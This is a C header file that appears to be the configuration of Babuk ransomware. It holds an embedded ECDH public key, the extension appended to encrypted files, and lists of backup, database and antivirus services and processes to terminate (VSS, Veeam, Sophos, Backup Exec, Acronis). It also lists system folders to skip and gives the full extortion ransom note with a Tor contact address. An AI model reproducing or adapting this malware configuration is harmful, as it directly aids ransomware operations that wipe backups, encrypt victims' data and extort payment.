#ifndef __LOCKER_CONFIG__
#define __LOCKER_CONFIG__

unsigned char MY_ECDH_PUB_KEY[144] = {
	0x36, 0x40, 0x45, 0x38, 0xF5, 0x41, 0x90, 0x95, 0x56, 0xB0, 0xC0, 0xAF,
	0x34, 0x8B, 0xBA, 0x53, 0x2E, 0x91, 0x21, 0x8F, 0xA6, 0xD7, 0x96, 0x6C,
	0x0D, 0xC0, 0xB3, 0x13, 0xBF, 0x0C, 0xAE, 0x44, 0x15, 0x63, 0x96, 0x1B,
	0xC0, 0xDF, 0x8D, 0x20, 0x64, 0x1F, 0xD5, 0xF6, 0x1B, 0xF7, 0x15, 0x1B,
	0xDC, 0x9D, 0x8F, 0xBB, 0x63, 0xF9, 0x46, 0x0E, 0x1F, 0x47, 0x4F, 0x19,
	0xE6, 0xE8, 0xBE, 0xFE, 0x98, 0x4D, 0xE1, 0x42, 0x64, 0x39, 0x0E, 0x07,
	0x3D, 0x4A, 0x50, 0x56, 0x7B, 0xD0, 0xEF, 0xF9, 0xBE, 0x37, 0xBD, 0xC5,
	0x51, 0x86, 0xD8, 0xE0, 0xDB, 0x82, 0x05, 0xEF, 0xA4, 0x97, 0xE4, 0x74,
	0x8F, 0xEB, 0xAF, 0x5F, 0x57, 0xBE, 0xD9, 0x40, 0x77, 0x11, 0xB7, 0x4B,
	0xF9, 0xC2, 0x60, 0x00, 0x90, 0xFF, 0x82, 0xE1, 0x65, 0x6E, 0xF2, 0x06,
	0x04, 0xB8, 0xA9, 0xDC, 0xD7, 0x1A, 0x74, 0x45, 0x8B, 0x86, 0xD0, 0xE1,
	0x01, 0x20, 0x5F, 0xD9, 0x71, 0xD4, 0x96, 0xC7, 0xC0, 0xFA, 0x6B, 0x05
};


// The file extension appened to files
const WCHAR RANSOM_EXT[] = L".__NIST_K571__";

// Services that are killed
const CHAR  *BLACKLISTED_SERVICES[]  =
{
	"vss",
	"sql",
	"svc$",
	"memtas",
	"mepocs",
	"sophos",
	"veeam",
	"backup",
	"GxVss",
	"GxBlr",
	"GxFWD",
	"GxCVD",
	"GxCIMgr",
	"DefWatch",
	"ccEvtMgr",
	"ccSetMgr",
	"SavRoam",
	"RTVscan",
	"QBFCService",
	"QBIDPService",
	"Intuit.QuickBooks.FCS",
	"QBCFMonitorService",
	"YooBackup",
	"YooIT",
	"zhudongfangyu",
	"sophos",
	"stc_raw_agent",
	"VSNAPVSS",
	"VeeamTransportSvc",
	"VeeamDeploymentService",
	"VeeamNFSSvc",
	"veeam",
	"PDVFSService",
	"BackupExecVSSProvider",
	"BackupExecAgentAccelerator",
	"BackupExecAgentBrowser",
	"BackupExecDiveciMediaService",
	"BackupExecJobEngine",
	"BackupExecManagementService",
	"BackupExecRPCService",
	"AcrSch2Svc",
	"AcronisAgent",
	"CASAD2DWebSvc",
	"CAARCUpdateSvc"
};

// Processes that are killed
const WCHAR *BLACKLISTED_PROCESSES[] =
{
	L"sql.exe",
	L"oracle.exe",
	L"ocssd.exe",
	L"dbsnmp.exe",
	L"synctime.exe",
	L"agntsvc.exe",
	L"isqlplussvc.exe",
	L"xfssvccon.exe",
	L"mydesktopservice.exe",
	L"ocautoupds.exe",
	L"encsvc.exe",
	L"firefox.exe",
	L"tbirdconfig.exe",
	L"mydesktopqos.exe",
	L"ocomm.exe",
	L"dbeng50.exe",
	L"sqbcoreservice.exe",
	L"excel.exe",
	L"infopath.exe",
	L"msaccess.exe",
	L"mspub.exe",
	L"onenote.exe",
	L"outlook.exe",
	L"powerpnt.exe",
	L"steam.exe",
	L"thebat.exe",
	L"thunderbird.exe",
	L"visio.exe",
	L"winword.exe",
	L"wordpad.exe",
	L"notepad.exe"
};

// Files that are skipped
const WCHAR *BLACKLISTED_FILENAMES[] =
{
	// Folder names
	L"Windows",
	L"Windows.old",
	L"Tor Browser",
	L"Internet Explorer",
	L"Google",
	L"Opera",
	L"Opera Software",
	L"Mozilla",
	L"Mozilla Firefox",
	L"$Recycle.Bin",
	L"ProgramData",
	L"All Users",
	
	// File names
	L"autorun.inf",
	L"boot.ini",
	L"bootfont.bin",
	L"bootsect.bak",
	L"bootmgr",
	L"bootmgr.efi",
	L"bootmgfw.efi",
	L"desktop.ini",
	L"iconcache.db",
	L"ntldr",
	L"ntuser.dat",
	L"ntuser.dat.log",
	L"ntuser.ini",
	L"thumbs.db",
	L"ecdh_pub_k.bin",
	L"Program Files",
	L"Program Files (x86)",
	L"..",
	L"."
};

// The name of the ransom note
const WCHAR RANSOM_NAME[]  = L"How To Restore Your Files.txt";

// The ransom note text
const CHAR  RANSOM_NOTE[]  =  "----------- [ Hello! ] ------------->\r\n"
					          "\r\n"
					          "       ****BY BABUK LOCKER****\r\n"
					          "\r\n"
					          "What happend?\r\n"
					          "----------------------------------------------\r\n"
					          "Your computers and servers are encrypted, backups are deleted from your network and copied. We use strong encr"
					          "yption algorithms, so you cannot decrypt your data.\r\n"
					          "But you can restore everything by purchasing a special program from us - a universal decoder. This program wil"
					          "l restore your entire network.\r\n"
					          "Follow our instructions below and you will recover all your data.\r\n"
					          "If you continue to ignore this for a long time, we will start reporting the hack to mainstream media and posti"
					          "ng your data to the dark web.\r\n"
					          "\r\n"
					          "What guarantees?\r\n"
					          "----------------------------------------------\r\n"
					          "We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our inte"
					          "rests.\r\n"
					          "All our decryption software is perfectly tested and will decrypt your data. We will also provide support in ca"
					          "se of problems.\r\n"
					          "We guarantee to decrypt one file for free. Go to the site and contact us.\r\n"
					          "\r\n"
					          "How to contact us? \r\n"
					          "----------------------------------------------\r\n"
					          "Using TOR Browser ( https://www.torproject.org/download/ ):\r\n"
					          "http://babukq4e2p4wu4iq.onion/login.php?id=8M60J4vCbbkKgM6QnA07E9qpkn0Qk7\r\n"
					          "\r\n"
					          "!!! DANGER !!!\r\n"
					          "DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. \r\n"
					          "!!! DANGER !!";


#endif